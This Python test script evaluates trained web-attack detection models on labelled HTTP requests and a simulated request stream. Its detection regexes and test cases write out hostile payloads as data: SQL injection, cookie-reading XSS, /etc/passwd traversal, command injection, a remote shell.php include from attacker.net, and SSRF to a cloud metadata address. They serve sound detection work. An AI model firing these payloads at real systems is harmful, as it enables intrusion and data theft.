"""
=============================================================
TEST SIMULATION — Run after main_pipeline.py
=============================================================
Tests trained models with:
  1. Known attack/normal test cases + metrics
  2. Custom requests you can edit
  3. Real-time stream simulation

Run:
    python test_simulation.py
=============================================================
"""

import os
import re
import math
import time
import random
import warnings
import joblib
import numpy as np
import pandas as pd
from datetime import datetime
from urllib.parse import unquote, urlparse, parse_qs
from sklearn.metrics import (
    classification_report, confusion_matrix,
    f1_score, accuracy_score,
    precision_score, recall_score
)

warnings.filterwarnings('ignore')
os.environ['TF_ENABLE_ONEDNN_OPTS'] = '0'
os.environ['TF_CPP_MIN_LOG_LEVEL']  = '3'

try:
    from tensorflow import keras
    TF_OK = True
except:
    TF_OK = False

from stage2_features import ALL_FEATURES


# ═══════════════════════════════════════════════════════════════
# LOAD TRAINED MODELS
# ═══════════════════════════════════════════════════════════════

def load_models():
    print("=" * 55)
    print("  Loading Trained Models...")
    print("=" * 55)
    m = {}

    # Autoencoder
    try:
        m['ae']           = keras.models.load_model(
            "models/autoencoder.keras")
        m['ae_threshold'] = joblib.load(
            "models/ae_threshold.pkl")
        print(f"  ✅ Autoencoder     "
              f"(threshold={m['ae_threshold']:.4f})")
    except Exception as e:
        m['ae'] = None; m['ae_threshold'] = 1.0
        print(f"  ❌ Autoencoder     {e}")

    # MLP Binary
    try:
        m['mlp_b'] = keras.models.load_model(
            "models/mlp_binary.keras")
        print(f"  ✅ MLP Binary")
    except Exception as e:
        m['mlp_b'] = None
        print(f"  ❌ MLP Binary      {e}")

    # MLP Multiclass
    try:
        m['mlp_m'] = keras.models.load_model(
            "models/mlp_multiclass.keras")
        d = joblib.load("models/label_encoder.pkl")
        m['le']      = d['le']
        m['classes'] = d['classes']
        print(f"  ✅ MLP Multiclass  Classes: {d['classes']}")
    except Exception as e:
        m['mlp_m'] = None
        print(f"  ❌ MLP Multiclass  {e}")

    # Scaler
    try:
        m['scaler'] = joblib.load("models/scaler.pkl")
        print(f"  ✅ Scaler")
    except Exception as e:
        m['scaler'] = None
        print(f"  ❌ Scaler          {e}")

    print()
    return m


# ═══════════════════════════════════════════════════════════════
# FEATURE EXTRACTION FOR SINGLE REQUEST
# ═══════════════════════════════════════════════════════════════

SQLI_RE    = re.compile(r"(union.*select|select.*from|drop\s+table|or\s+1\s*=\s*1|' or '|--|%27|%3b|sleep\s*\(|benchmark)", re.I)
XSS_RE     = re.compile(r"(<script|javascript:|onerror\s*=|onload\s*=|alert\s*\(|<svg|eval\s*\(|%3cscript)", re.I)
PATH_RE    = re.compile(r"(\.\./|\.\.\\|%2e%2e|/etc/passwd|windows[\\/]system32|/proc/self)", re.I)
CMD_RE     = re.compile(r"(%3b|%7c|\||;|`|\$\(|cat\s+/|/bin/sh|cmd\.exe)", re.I)
RFI_RE     = re.compile(r"(https?://[^/]+\.[a-z]{2,}/.*\.(php|asp|jsp)|ftp://|php://)", re.I)
SSRF_RE    = re.compile(r"(169\.254\.169\.254|localhost|127\.\d+\.\d+\.\d+|file://|metadata\.google)", re.I)
SCANNER_RE = re.compile(r"(sqlmap|nikto|nmap|dirbuster|wfuzz|hydra|acunetix|burpsuite|havij)", re.I)

def _ent(s):
    s = str(s)
    if len(s) < 2: return 0.0
    freq = [s.count(c)/len(s) for c in set(s)]
    return -sum(p * math.log2(p) for p in freq if p > 0)

def extract_request(ip, method, endpoint, status,
                     user_agent='', content='',
                     bytes_val=0, latency=0.0):
    ep  = str(endpoint)
    ua  = str(user_agent)
    cnt = str(content)
    com = unquote(ep + ' ' + cnt)
    mm  = {'GET':0,'POST':1,'PUT':2,'DELETE':3,
           'HEAD':4,'OPTIONS':5,'PATCH':6}

    f = {
        'url_length':         len(ep),
        'url_entropy':        _ent(unquote(ep)),
        'url_special_chars':  sum(1 for c in unquote(ep)
                                  if c in "';\"<>(){}[]\\|`~!@#%^&*=+,"),
        'url_param_count':    ep.count('='),
        'url_max_param_len':  max(
            [len(p.split('=')[-1]) for p in ep.split('&')
             if '=' in p], default=0),
        'url_dir_depth':      ep.count('/'),
        'url_is_encoded':     1 if re.search(
            r'%[0-9a-fA-F]{2}', ep) else 0,
        'url_double_encoded': 1 if re.search(
            r'%25[0-9a-fA-F]{2}', ep) else 0,
        'sqli_flag':      1 if SQLI_RE.search(com) else 0,
        'xss_flag':       1 if XSS_RE.search(com)  else 0,
        'traversal_flag': 1 if PATH_RE.search(com)  else 0,
        'cmdinj_flag':    1 if CMD_RE.search(com)   else 0,
        'rfi_flag':       1 if RFI_RE.search(com)   else 0,
        'ssrf_flag':      1 if SSRF_RE.search(com)  else 0,
        'scanner_ua':     1 if SCANNER_RE.search(ua) else 0,
        'method_encoded':        mm.get(method.upper(), 7),
        'is_post':               1 if method.upper()=='POST' else 0,
        'is_suspicious_method':  1 if method.upper()
                                 in ['TRACE','TRACK','CONNECT'] else 0,
        'status_2xx': 1 if 200<=status<300 else 0,
        'status_3xx': 1 if 300<=status<400 else 0,
        'status_4xx': 1 if 400<=status<500 else 0,
        'status_5xx': 1 if 500<=status<600 else 0,
        'status_403': 1 if status==403 else 0,
        'status_500': 1 if status==500 else 0,
        'content_length_feat': len(cnt),
        'content_entropy':     _ent(unquote(cnt)),
        'content_sqli':        1 if SQLI_RE.search(unquote(cnt)) else 0,
        'content_xss':         1 if XSS_RE.search(unquote(cnt)) else 0,
        'bytes_feat':   bytes_val,
        'latency_feat': latency,
        'ua_length':   len(ua),
        'ua_is_empty': 1 if ua.strip()=='' else 0,
        'ua_is_bot':   1 if re.search(
            r'(bot|crawler|spider)', ua, re.I) else 0,
        'has_referrer': 0,
        'ext_referrer': 0,
        'req_rate':         1,
        'error_rate':       0,
        'repeat_url_ratio': 0,
        'unique_endpoints': 1,
        'sqli_rate_window': 1 if SQLI_RE.search(com) else 0,
    }
    f['attack_flag_sum'] = (f['sqli_flag'] + f['xss_flag'] +
                             f['traversal_flag'] + f['cmdinj_flag'] +
                             f['rfi_flag'] + f['ssrf_flag'])
    return np.array([[f[feat] for feat in ALL_FEATURES]],
                     dtype=float)


# ═══════════════════════════════════════════════════════════════
# PREDICT SINGLE REQUEST
# ═══════════════════════════════════════════════════════════════

def predict(ip, method, endpoint, status,
            user_agent, content, m,
            threshold=0.50):

    X_raw = extract_request(
        ip, method, endpoint, status, user_agent, content)
    X = m['scaler'].transform(X_raw) if m['scaler'] else X_raw

    # Autoencoder score
    if m['ae'] and TF_OK:
        pred  = m['ae'].predict(X, verbose=0)
        mse   = float(np.mean(np.square(X - pred)))
        ae_s  = min(1.0, mse / (m['ae_threshold'] + 1e-8))
    else:
        ae_s = 0.5

    # MLP Binary score
    if m['mlp_b'] and TF_OK:
        mlp_s = float(m['mlp_b'].predict(X, verbose=0)[0][0])
    else:
        mlp_s = 0.5

    # MLP Multiclass
    if m['mlp_m'] and TF_OK:
        enc   = np.argmax(
            m['mlp_m'].predict(X, verbose=0), axis=1)[0]
        atype = m['le'].inverse_transform([enc])[0]
    else:
        atype = 'unknown'

    # Fusion
    final     = 0.30 * ae_s + 0.70 * mlp_s
    is_attack = final >= threshold

    sev_boost = {'CommandInjection':0.10,'SQLi':0.08,
                 'RFI':0.10,'SSRF':0.10,'LFI':0.05,
                 'PathTraversal':0.07,'XSS':0.05}
    boosted = min(1.0, final + sev_boost.get(atype, 0))
    sev = ('CRITICAL' if boosted>=0.85 else
           'HIGH'     if boosted>=0.70 else
           'MEDIUM'   if boosted>=0.50 else 'LOW')

    return {
        'endpoint':    endpoint,
        'ae_score':    round(ae_s,  4),
        'mlp_score':   round(mlp_s, 4),
        'final_score': round(final, 4),
        'is_attack':   is_attack,
        'attack_type': atype,
        'severity':    sev if is_attack else 'NONE',
    }


# ═══════════════════════════════════════════════════════════════
# TEST CASES — 18 known requests
# ═══════════════════════════════════════════════════════════════

TEST_CASES = [
    # Normal
    {'label':0,'true_type':'Normal','method':'GET',
     'endpoint':'/index.html','status':200,
     'user_agent':'Mozilla/5.0','content':''},
    {'label':0,'true_type':'Normal','method':'GET',
     'endpoint':'/products?category=books&page=2',
     'status':200,'user_agent':'Chrome/91.0','content':''},
    {'label':0,'true_type':'Normal','method':'POST',
     'endpoint':'/login','status':200,
     'user_agent':'Firefox/89.0',
     'content':'username=john&password=pass123'},
    {'label':0,'true_type':'Normal','method':'GET',
     'endpoint':'/api/v1/users','status':200,
     'user_agent':'Mozilla/5.0','content':''},
    {'label':0,'true_type':'Normal','method':'GET',
     'endpoint':'/robots.txt','status':200,
     'user_agent':'Googlebot/2.1','content':''},
    # SQLi
    {'label':1,'true_type':'SQLi','method':'GET',
     'endpoint':"/login?user=admin'--&pass=x",
     'status':200,'user_agent':'Mozilla/5.0','content':''},
    {'label':1,'true_type':'SQLi','method':'POST',
     'endpoint':'/search','status':500,
     'user_agent':'sqlmap/1.4',
     'content':"id=1 UNION SELECT username,password FROM users--"},
    {'label':1,'true_type':'SQLi','method':'GET',
     'endpoint':"/page?id=1' OR '1'='1",
     'status':200,'user_agent':'Mozilla/5.0','content':''},
    # XSS
    {'label':1,'true_type':'XSS','method':'GET',
     'endpoint':"/search?q=%3Csvg/onload=alert%281%29%3E",
     'status':403,'user_agent':'Mozilla/5.0','content':''},
    {'label':1,'true_type':'XSS','method':'POST',
     'endpoint':'/comment','status':200,
     'user_agent':'Mozilla/5.0',
     'content':'<script>document.cookie</script>'},
    # PathTraversal
    {'label':1,'true_type':'PathTraversal','method':'GET',
     'endpoint':'/download?file=../../../etc/passwd',
     'status':403,'user_agent':'curl/7.64','content':''},
    # CommandInjection
    {'label':1,'true_type':'CommandInjection','method':'GET',
     'endpoint':'/ping?host=127.0.0.1%3Bid',
     'status':500,'user_agent':'Mozilla/5.0','content':''},
    {'label':1,'true_type':'CommandInjection','method':'POST',
     'endpoint':'/exec','status':200,
     'user_agent':'Mozilla/5.0',
     'content':'host=127.0.0.1; cat /etc/passwd'},
    # RFI
    {'label':1,'true_type':'RFI','method':'GET',
     'endpoint':'/load?url=https://attacker.net/shell.php',
     'status':500,'user_agent':'Mozilla/5.0','content':''},
    # LFI
    {'label':1,'true_type':'LFI','method':'GET',
     'endpoint':'/page?file=../../../etc/passwd',
     'status':404,'user_agent':'Mozilla/5.0','content':''},
    # SSRF
    {'label':1,'true_type':'SSRF','method':'GET',
     'endpoint':'/fetch?url=http://169.254.169.254/meta-data/',
     'status':200,'user_agent':'python-requests/2.25',
     'content':''},
    # Scanner
    {'label':1,'true_type':'SQLi','method':'GET',
     'endpoint':'/admin?id=1',
     'status':200,'user_agent':'nikto/2.1','content':''},
    # Normal API
    {'label':0,'true_type':'Normal','method':'POST',
     'endpoint':'/api/orders','status':201,
     'user_agent':'MyApp/2.0',
     'content':'product_id=123&quantity=2'},
]


def run_test_cases(m, threshold=0.50):
    print("\n" + "═"*60)
    print("  🧪  TEST CASES — Known Attacks + Normal")
    print("═"*60)

    y_true, y_pred = [], []
    icons = {'CRITICAL':'🔴','HIGH':'🟠',
             'MEDIUM':'🟡','LOW':'🟢','NONE':'✅'}

    for i, tc in enumerate(TEST_CASES):
        res = predict(
            ip='10.0.0.1', method=tc['method'],
            endpoint=tc['endpoint'], status=tc['status'],
            user_agent=tc['user_agent'],
            content=tc['content'],
            m=m, threshold=threshold)

        correct = (int(res['is_attack']) == tc['label'])
        mark    = '✅' if correct else '❌'
        sev_i   = icons.get(res['severity'], '⚪')

        print(f"\n  {mark} Test {i+1:02d} | "
              f"True: {tc['true_type']:<18} "
              f"Pred: {res['attack_type']:<18} "
              f"{sev_i}{res['severity']}")
        print(f"       Scores → "
              f"AE:{res['ae_score']:.3f} "
              f"MLP:{res['mlp_score']:.3f} "
              f"Final:{res['final_score']:.3f}")

        y_true.append(tc['label'])
        y_pred.append(int(res['is_attack']))

    # Metrics
    print("\n" + "═"*60)
    print("  📊  METRICS")
    print("═"*60)

    acc  = accuracy_score(y_true, y_pred)
    f1   = f1_score(y_true, y_pred, zero_division=0)
    prec = precision_score(y_true, y_pred, zero_division=0)
    rec  = recall_score(y_true, y_pred, zero_division=0)

    print(f"\n  Accuracy  : {acc:.2%}")
    print(f"  Precision : {prec:.2%}")
    print(f"  Recall    : {rec:.2%}")
    print(f"  F1 Score  : {f1:.2%}")

    cm = confusion_matrix(y_true, y_pred)
    tn, fp, fn, tp = cm.ravel()
    print(f"\n  Confusion Matrix:")
    print(f"                Pred Normal  Pred Attack")
    print(f"  True Normal   [{tn:5d}        {fp:5d}]")
    print(f"  True Attack   [{fn:5d}        {tp:5d}]")
    print(f"\n  True Positives  (attacks caught) : {tp}")
    print(f"  True Negatives  (normal passed)   : {tn}")
    print(f"  False Positives (false alarm)      : {fp}")
    print(f"  False Negatives (missed attack)    : {fn}")


def run_stream(m, n=20):
    print("\n" + "═"*60)
    print(f"  ⚡  REAL-TIME STREAM — {n} requests")
    print("═"*60 + "\n")

    stream = [
        ('GET', '/index.html',                    200, 'Mozilla/5.0', ''),
        ('GET', '/products?page=2',               200, 'Chrome/91.0', ''),
        ('GET', '/about',                         200, 'Safari/14', ''),
        ('POST','/login',                         200, 'Firefox/89', 'user=a&pass=b'),
        ("GET", "/login?id=1' OR '1'='1",         200, 'sqlmap/1.4', ''),
        ('GET', '/search?q=<script>alert(1)</script>', 403, 'Mozilla/5.0', ''),
        ('GET', '/../../../etc/passwd',            403, 'nikto/2.1', ''),
        ('POST','/ping',                          500, 'curl/7.64', 'host=127.0.0.1;id'),
        ('GET', '/fetch?url=http://169.254.169.254', 200, 'python-requests/2.25', ''),
        ('GET', '/api/status',                    200, 'Go-http-client/1.1', ''),
    ]

    alerts, normal = 0, 0
    icons = {'CRITICAL':'🔴','HIGH':'🟠','MEDIUM':'🟡'}

    for i in range(n):
        method, ep, status, ua, content = random.choice(stream)
        ip  = f"10.0.{random.randint(0,5)}.{random.randint(1,50)}"
        res = predict(ip, method, ep, status, ua, content, m)
        ts  = datetime.now().strftime('%H:%M:%S')

        if res['is_attack']:
            alerts += 1
            icon = icons.get(res['severity'], '🟡')
            print(f"  [{ts}] {icon} ALERT "
                  f"| {res['attack_type']:<18} "
                  f"Score:{res['final_score']:.3f} "
                  f"| {ip} → {ep[:40]}")
        else:
            normal += 1
            print(f"  [{ts}] ✅ Normal         "
                  f"Score:{res['final_score']:.3f} "
                  f"| {ip} → {ep[:40]}")
        time.sleep(0.05)

    print(f"\n  Done: {alerts} Alerts | {normal} Normal\n")


# ═══════════════════════════════════════════════════════════════
if __name__ == "__main__":
    m = load_models()
    run_test_cases(m)
    run_stream(m, n=20)
    print("\n✅  Test simulation complete!\n")
